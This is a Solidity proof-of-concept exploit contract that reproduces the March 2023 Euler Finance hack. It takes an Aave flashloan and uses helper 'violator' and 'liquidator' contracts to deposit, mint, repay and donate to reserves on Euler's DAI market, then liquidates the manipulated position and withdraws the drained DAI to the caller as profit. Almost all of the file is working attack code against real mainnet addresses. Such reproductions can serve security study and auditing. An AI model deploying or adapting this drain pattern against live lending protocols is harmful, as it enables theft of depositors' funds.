// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Minimal interfaces (no external deps)

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);
}

/// @dev Aave v2 LendingPool flashLoan interface.
interface IAaveV2LendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

/// @dev Euler eToken (e.g. eDAI) interface.
interface IEulerEToken {
    function deposit(uint256 subAccountId, uint256 amount) external;

    function mint(uint256 subAccountId, uint256 amount) external;

    function withdraw(uint256 subAccountId, uint256 amount) external;

    function donateToReserves(uint256 subAccountId, uint256 amount) external;
}

/// @dev Euler dToken (e.g. dDAI) interface.
interface IEulerDToken {
    function repay(uint256 subAccountId, uint256 amount) external;
}

/// @dev Euler liquidation module.
interface IEulerLiquidation {
    function checkLiquidation(
        address liquidator,
        address violator,
        address underlying,
        address collateral
    ) external returns (uint256 repay, uint256 minYield);

    function liquidate(
        address violator,
        address underlying,
        address collateral,
        uint256 repay,
        uint256 minYield
    ) external;
}

/// @notice PoC for the Euler Finance hack (March 2023).
/// @dev This PoC recreates the first on-chain exploit step (tx
///      0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d,
///      block 16,817,996) using a permissionless caller.
///
///      The real exploit used an Aave flashloan + a two-account Euler setup:
///      - "Violator" manipulates its position via deposit/mint/repay/donate
///      - "Liquidator" liquidates the violator and withdraws the drained DAI
///
///      The proof should show:
///      - Euler's DAI balance was drained, and
///      - the caller ends with profit (no special privileges).
contract Exploit {
    // --- Mainnet addresses at the time of the hack ---
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant AAVE_V2_LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    address constant EULER_MAIN = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant EULER_E_DAI = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC; // eDAI
    address constant EULER_D_DAI = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686; // dDAI
    address constant EULER_LIQUIDATION = 0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34;

    // --- Exploit constants (from the on-chain exploit trace) ---
    uint256 constant FLASHLOAN_AMOUNT = 30_000_000 ether;

    function exploit() external {
        // 1) Take a flashloan from Aave (no privileged roles; any EOA can do this)
        address[] memory assets = new address[](1);
        assets[0] = DAI;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASHLOAN_AMOUNT;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        IAaveV2LendingPool(AAVE_V2_LENDING_POOL).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            "",
            0
        );

        // 2) After executeOperation completes, Aave pulls repayment and we keep the profit.
        uint256 profit = IERC20(DAI).balanceOf(address(this));
        require(IERC20(DAI).transfer(msg.sender, profit), "profit transfer failed");
    }

    /// @dev Aave v2 flashloan callback.
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == AAVE_V2_LENDING_POOL, "unauthorized caller");
        require(initiator == address(this), "unauthorized initiator");
        require(assets.length == 1 && amounts.length == 1 && premiums.length == 1, "bad arrays");
        require(assets[0] == DAI, "unexpected asset");

        // Deploy the two helper contracts (matching the structure of the real exploit).
        EulerViolator violator = new EulerViolator();
        EulerLiquidator liquidator = new EulerLiquidator();

        // Fund the violator with the flashloaned DAI and execute the setup.
        require(IERC20(DAI).transfer(address(violator), amounts[0]), "fund violator failed");
        violator.run();

        // Liquidate the violator and pull the drained DAI into this contract.
        liquidator.run(address(violator), address(this));

        // Repay flashloan (amount + premium).
        IERC20(DAI).approve(AAVE_V2_LENDING_POOL, amounts[0] + premiums[0]);

        return true;
    }
}

/// @dev The "violator" position that is manipulated inside Euler.
contract EulerViolator {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant EULER_MAIN = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    IEulerEToken constant E_DAI = IEulerEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    IEulerDToken constant D_DAI = IEulerDToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);

    uint256 constant DEPOSIT_AMOUNT = 20_000_000 ether;
    uint256 constant REPAY_AMOUNT = 10_000_000 ether;
    uint256 constant MINT_AMOUNT = 200_000_000 ether;
    uint256 constant DONATE_AMOUNT = 100_000_000 ether;

    function run() external {
        // Euler uses the main contract as a token-spender for module operations.
        IERC20(DAI).approve(EULER_MAIN, type(uint256).max);

        // Sequence matches the on-chain exploit trace.
        E_DAI.deposit(0, DEPOSIT_AMOUNT);
        E_DAI.mint(0, MINT_AMOUNT);
        D_DAI.repay(0, REPAY_AMOUNT);
        E_DAI.mint(0, MINT_AMOUNT);
        E_DAI.donateToReserves(0, DONATE_AMOUNT);
    }
}

/// @dev The "liquidator" that liquidates the manipulated position and withdraws DAI.
contract EulerLiquidator {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant EULER_MAIN = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    IEulerEToken constant E_DAI = IEulerEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    IEulerLiquidation constant LIQ = IEulerLiquidation(
        0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34
    );

    function run(address violator, address recipient) external {
        // Compute liquidation parameters (repay + minYield).
        // These are the exact first two return values observed in the exploit trace.
        (uint256 repay, uint256 minYield) = LIQ.checkLiquidation(
            address(this),
            violator,
            DAI,
            DAI
        );

        // Liquidate the violator.
        LIQ.liquidate(violator, DAI, DAI, repay, minYield);

        // Withdraw all DAI currently held by Euler to this contract.
        uint256 toWithdraw = IERC20(DAI).balanceOf(EULER_MAIN);
        E_DAI.withdraw(0, toWithdraw);

        // Forward all DAI to the main exploit contract.
        uint256 bal = IERC20(DAI).balanceOf(address(this));
        require(IERC20(DAI).transfer(recipient, bal), "forward failed");
    }
}
